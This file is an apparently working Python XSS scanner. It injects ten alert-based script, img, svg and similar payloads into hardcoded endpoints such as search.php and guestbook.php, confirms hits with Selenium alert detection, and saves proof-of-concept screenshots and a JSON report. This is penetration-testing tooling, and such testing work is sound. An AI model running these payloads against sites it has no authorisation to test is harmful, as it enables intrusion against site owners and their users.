#!/usr/bin/env python3
"""
Final XSS Scanner - Working Version
Uses the exact URLs and parameters that are known to be vulnerable
"""

import requests
import time
import random
import urllib.parse
import re
from urllib.parse import urlparse, parse_qs
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoAlertPresentException, TimeoutException
import logging
from datetime import datetime
import os
import json

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('final_xss_scanner.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    END = '\033[0m'

class FinalXSSScanner:
    """Final XSS Scanner with working vulnerable endpoints"""
    
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        self.driver = None
        self.unique_alert_id = f"FINAL_XSS_{random.randint(10000, 99999)}"
        self.vulnerabilities = []
        self.setup_selenium()
    
    def setup_selenium(self):
        """Setup Selenium WebDriver"""
        try:
            chrome_options = Options()
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--window-size=1920,1080')
            
            # Try system ChromeDriver first
            try:
                self.driver = webdriver.Chrome(options=chrome_options)
                self.driver.set_page_load_timeout(30)
                logger.info(f"{Colors.GREEN}[SELENIUM] WebDriver initialized{Colors.END}")
            except Exception as e:
                logger.error(f"{Colors.RED}[SELENIUM] Failed to initialize WebDriver: {e}{Colors.END}")
                self.driver = None
                
        except Exception as e:
            logger.error(f"{Colors.RED}[SELENIUM] Error: {e}{Colors.END}")
            self.driver = None
    
    def get_simple_payloads(self):
        """Get simple XSS payloads for testing"""
        return [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<marquee onstart="alert(\'XSS\')">',
            '<body onload=alert("XSS")>',
            '<input onfocus=alert("XSS") autofocus>',
            '<details open ontoggle="alert(\'XSS\')">',
            '<video><source onerror="alert(\'XSS\')">',
            '<audio src=x onerror=alert("XSS")>'
        ]
    
    def test_xss_final(self, url, parameter, payload, method='GET'):
        """Final XSS testing method"""
        if not self.driver:
            logger.warning(f"{Colors.YELLOW}[XSS] Chrome not available, using fallback{Colors.END}")
            return self.test_xss_fallback(url, parameter, payload, method)
        
        try:
            # Create unique payload
            unique_payload = payload.replace('alert("XSS")', f'alert("{self.unique_alert_id}")')
            unique_payload = unique_payload.replace("alert('XSS')", f"alert('{self.unique_alert_id}')")
            
            # Prepare test URL
            if method == 'GET':
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                query_params[parameter] = [unique_payload]
                new_query = urllib.parse.urlencode(query_params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            else:
                test_url = url
                self.driver.get(test_url)
                try:
                    # Find form and submit
                    input_field = self.driver.find_element(By.NAME, parameter)
                    input_field.clear()
                    input_field.send_keys(unique_payload)
                    form = input_field.find_element(By.XPATH, "./ancestor::form[1]")
                    form.submit()
                    time.sleep(2)
                except Exception as e:
                    logger.warning(f"{Colors.YELLOW}[XSS] Form submission failed: {e}{Colors.END}")
                    return False, test_url, None, None
                test_url = self.driver.current_url
            
            logger.info(f"{Colors.CYAN}[XSS] Testing: {test_url}{Colors.END}")
            logger.info(f"{Colors.CYAN}[PAYLOAD] {payload}{Colors.END}")
            
            if method == 'GET':
                self.driver.get(test_url)
            
            # Wait for page load
            time.sleep(3)
            
            # Enhanced alert detection
            alert_detected = False
            alert_text = None
            screenshot_path = None
            
            # Try to catch alert
            for attempt in range(3):
                try:
                    # Wait for alert
                    WebDriverWait(self.driver, 2).until(EC.alert_is_present())
                    
                    # Switch to alert
                    alert = self.driver.switch_to.alert
                    alert_text = alert.text
                    
                    logger.info(f"{Colors.CYAN}[ALERT] Detected: {alert_text}{Colors.END}")
                    
                    # Check if it's our unique alert
                    if self.unique_alert_id in alert_text:
                        logger.info(f"{Colors.GREEN}[XSS] SUCCESS! Our alert detected: {alert_text}{Colors.END}")
                        
                        # Take screenshot BEFORE accepting alert
                        try:
                            screenshot_path = self.capture_screenshot(test_url, parameter, payload)
                            logger.info(f"{Colors.GREEN}[SCREENSHOT] PoC saved: {screenshot_path}{Colors.END}")
                        except Exception as screenshot_error:
                            logger.warning(f"{Colors.YELLOW}[XSS] Screenshot failed: {screenshot_error}{Colors.END}")
                        
                        # Accept alert
                        alert.accept()
                        alert_detected = True
                        break
                    else:
                        # Not our alert, dismiss it
                        alert.dismiss()
                        logger.info(f"{Colors.YELLOW}[XSS] Alert dismissed (not ours): {alert_text}{Colors.END}")
                        time.sleep(1)
                        
                except NoAlertPresentException:
                    # No alert present
                    break
                except Exception as e:
                    logger.warning(f"{Colors.YELLOW}[XSS] Alert handling error (attempt {attempt + 1}): {e}{Colors.END}")
                    time.sleep(1)
                    continue
            
            # If no alert, check for reflection
            if not alert_detected:
                try:
                    page_source = self.driver.page_source
                    if unique_payload in page_source or payload in page_source:
                        logger.info(f"{Colors.GREEN}[XSS] SUCCESS! Payload reflected in page{Colors.END}")
                        try:
                            screenshot_path = self.capture_screenshot(test_url, parameter, payload)
                            logger.info(f"{Colors.GREEN}[SCREENSHOT] PoC saved: {screenshot_path}{Colors.END}")
                        except Exception as screenshot_error:
                            logger.warning(f"{Colors.YELLOW}[XSS] Screenshot failed: {screenshot_error}{Colors.END}")
                        alert_detected = True
                        alert_text = "Reflected in page"
                except Exception as e:
                    logger.warning(f"{Colors.YELLOW}[XSS] Reflection check failed: {e}{Colors.END}")
            
            if alert_detected:
                logger.info(f"{Colors.GREEN}[VULN] XSS CONFIRMED in {test_url} parameter: {parameter}{Colors.END}")
                logger.info(f"{Colors.GREEN}[PAYLOAD] {payload}{Colors.END}")
                logger.info(f"{Colors.GREEN}[TEST_URL] {test_url}{Colors.END}")
                if alert_text:
                    logger.info(f"{Colors.GREEN}[ALERT] {alert_text}{Colors.END}")
                
                return True, test_url, alert_text, screenshot_path
            else:
                return False, test_url, None, None
                
        except Exception as e:
            logger.error(f"{Colors.RED}[XSS] Error testing with Chrome: {e}{Colors.END}")
            return False, None, None, None
    
    def test_xss_fallback(self, url, parameter, payload, method='GET'):
        """Fallback XSS testing when Chrome is not available"""
        try:
            unique_payload = payload.replace('alert("XSS")', f'alert("{self.unique_alert_id}")')
            unique_payload = unique_payload.replace("alert('XSS')", f"alert('{self.unique_alert_id}')")
            
            if method == 'GET':
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                query_params[parameter] = [unique_payload]
                new_query = urllib.parse.urlencode(query_params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                response = self.session.get(test_url, timeout=10)
            else:
                test_url = url
                response = self.session.post(test_url, data={parameter: unique_payload}, timeout=10)
            
            if unique_payload in response.text or payload in response.text:
                logger.info(f"{Colors.GREEN}[XSS] SUCCESS! Payload reflected (fallback){Colors.END}")
                return True, test_url, "Reflected (fallback)", None
            
            return False, test_url, None, None
            
        except Exception as e:
            logger.error(f"{Colors.RED}[XSS] Fallback testing error: {e}{Colors.END}")
            return False, None, None, None
    
    def capture_screenshot(self, test_url, parameter, payload):
        """Capture screenshot of XSS PoC"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"xss_poc_{timestamp}_{hash(payload) % 100000:05d}.png"
            
            # Create screenshots directory
            os.makedirs("xss_poc_screenshots", exist_ok=True)
            filepath = os.path.join("xss_poc_screenshots", filename)
            
            # Take screenshot
            self.driver.save_screenshot(filepath)
            
            return filepath
            
        except Exception as e:
            logger.error(f"{Colors.RED}[SCREENSHOT] Error capturing screenshot: {e}{Colors.END}")
            return None
    
    def scan_known_vulnerable_endpoints(self):
        """Scan known vulnerable endpoints from previous successful scans"""
        logger.info(f"{Colors.BLUE}[XSS] Testing known vulnerable endpoints...{Colors.END}")
        
        # Known vulnerable endpoints from previous scans
        vulnerable_endpoints = [
            {
                'url': f'{self.target_url}/search.php?test=query',
                'parameter': 'searchFor',
                'method': 'GET'
            },
            {
                'url': f'{self.target_url}/guestbook.php',
                'parameter': 'text',
                'method': 'POST'
            },
            {
                'url': f'{self.target_url}/search.php',
                'parameter': 'searchFor',
                'method': 'GET'
            },
            {
                'url': f'{self.target_url}/userinfo.php',
                'parameter': 'uname',
                'method': 'POST'
            },
            {
                'url': f'{self.target_url}/userinfo.php',
                'parameter': 'pass',
                'method': 'POST'
            }
        ]
        
        payloads = self.get_simple_payloads()
        
        for endpoint in vulnerable_endpoints:
            url = endpoint['url']
            parameter = endpoint['parameter']
            method = endpoint['method']
            
            logger.info(f"{Colors.CYAN}[ENDPOINT] Testing {url} parameter: {parameter} ({method}){Colors.END}")
            
            for i, payload in enumerate(payloads, 1):
                try:
                    logger.info(f"{Colors.CYAN}[PAYLOAD {i}/{len(payloads)}] {payload}{Colors.END}")
                    
                    is_vulnerable, test_url, alert_text, screenshot_path = self.test_xss_final(
                        url, parameter, payload, method
                    )
                    
                    if is_vulnerable:
                        vulnerability = {
                            'url': test_url,
                            'parameter': parameter,
                            'payload': payload,
                            'method': method,
                            'alert_text': alert_text,
                            'screenshot': screenshot_path
                        }
                        self.vulnerabilities.append(vulnerability)
                        
                        # Move to next endpoint after finding vulnerability
                        logger.info(f"{Colors.GREEN}[SUCCESS] Vulnerability found! Moving to next endpoint...{Colors.END}")
                        break
                        
                except Exception as e:
                    logger.error(f"{Colors.RED}[XSS] Error testing payload: {e}{Colors.END}")
                    continue
    
    def generate_report(self):
        """Generate comprehensive XSS vulnerability report"""
        logger.info(f"{Colors.BLUE}[REPORT] Generating XSS vulnerability report...{Colors.END}")
        
        if not self.vulnerabilities:
            logger.info(f"{Colors.YELLOW}[REPORT] No XSS vulnerabilities found{Colors.END}")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"final_xss_report_{timestamp}.json"
        
        report_data = {
            'target': self.target_url,
            'scan_time': datetime.now().isoformat(),
            'total_vulnerabilities': len(self.vulnerabilities),
            'vulnerabilities': self.vulnerabilities
        }
        
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
        
        logger.info(f"{Colors.GREEN}[REPORT] Report saved: {report_file}{Colors.END}")
        
        # Print summary
        print(f"\n{Colors.GREEN}🎯 XSS SCAN SUMMARY{Colors.END}")
        print(f"{Colors.GREEN}Target: {self.target_url}{Colors.END}")
        print(f"{Colors.GREEN}Vulnerabilities found: {len(self.vulnerabilities)}{Colors.END}")
        print(f"{Colors.GREEN}Report saved: {report_file}{Colors.END}")
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            print(f"\n{Colors.CYAN}[VULN {i}]{Colors.END}")
            print(f"URL: {vuln['url']}")
            print(f"Parameter: {vuln['parameter']}")
            print(f"Payload: {vuln['payload']}")
            print(f"Method: {vuln['method']}")
            if vuln['screenshot']:
                print(f"Screenshot: {vuln['screenshot']}")
    
    def cleanup(self):
        """Cleanup resources"""
        if self.driver:
            try:
                self.driver.quit()
                logger.info(f"{Colors.GREEN}[CLEANUP] Chrome WebDriver closed{Colors.END}")
            except Exception as e:
                logger.warning(f"{Colors.YELLOW}[CLEANUP] Error closing WebDriver: {e}{Colors.END}")

def main():
    """Main function"""
    import sys
    
    if len(sys.argv) != 2:
        print("Usage: python3 final_xss_scanner.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1].rstrip('/')  # Remove trailing slash
    
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║                   FINAL XSS SCANNER                         ║
║              Testing Known Vulnerable Endpoints             ║
║                                                              ║
║  🎯 Known Vulnerable URLs                                   ║
║  🛡️  Simple Payload Strategy                                ║
║  📸 Enhanced Screenshot Capture                            ║
║  ⚡ Fast & Accurate                                        ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    print(f"🎯 Target: {target_url}")
    print(f"🕐 Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    # Create scanner instance
    scanner = FinalXSSScanner(target_url)
    
    try:
        # Scan known vulnerable endpoints
        scanner.scan_known_vulnerable_endpoints()
        
        # Generate report
        scanner.generate_report()
        
    except KeyboardInterrupt:
        logger.info(f"{Colors.YELLOW}[SCAN] Scan interrupted by user{Colors.END}")
    except Exception as e:
        logger.error(f"{Colors.RED}[SCAN] Scan error: {e}{Colors.END}")
    finally:
        scanner.cleanup()
        print(f"\n{Colors.GREEN}🔒 Final XSS Scanner - Completed{Colors.END}")

if __name__ == "__main__":
    main()